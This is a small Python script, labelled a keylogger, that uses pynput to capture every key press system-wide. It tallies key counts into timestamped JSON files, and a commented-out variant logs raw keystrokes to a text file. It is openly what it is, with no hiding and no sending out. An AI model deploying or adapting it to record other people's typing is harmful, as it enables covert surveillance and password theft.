# keylogger using pynput module

import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta
import json
import os, sys


class timer:
    keys_counter = {}
    curr_time = ""
    next_tick = ""


timer.curr_time = datetime.now()
timer.next_tick = timer.curr_time + timedelta(minutes=5)
verbose = False


def on_press(key):

    #keys.append(key)
    if verbose:
        print(str(key))
    write_file(key)

    '''try:
        print('alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('special key {0} pressed'.format(key))
        '''

def write_file(key):
    path = "./files"
    isExist = os.path.exists(path)

    if not isExist:

        # Create a new directory because it does not exist
        os.makedirs(path)

    if str(key) in timer.keys_counter:
        timer.keys_counter[str(key)] += 1
    else:

        timer.keys_counter[str(key)] = 1
        if (datetime.now() - timer.curr_time).total_seconds() > 500:

            f_tmp = open('./files/output'+timer.curr_time.strftime("%Y%m%d%H%M")+".json", 'w')
            json.dump(timer.keys_counter, f_tmp)
            f_tmp.close()
            print(timer.curr_time)
            timer.curr_time = datetime.now()
            timer.keys_counter = {}

    '''with open('log.txt', 'w') as f:
        for key in keys:

            # removing ''
            k = str(key).replace("'", "")
            f.write(k)

            # explicitly adding a space after
            # every keystroke for readability
            f.write(' ')'''

def on_release(key):
    #print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return True


if len(sys.argv) > 1 and sys.argv[1].lower() == "verbose":
    verbose = True
with Listener(on_press = on_press,
              on_release = on_release) as listener:

    listener.join()
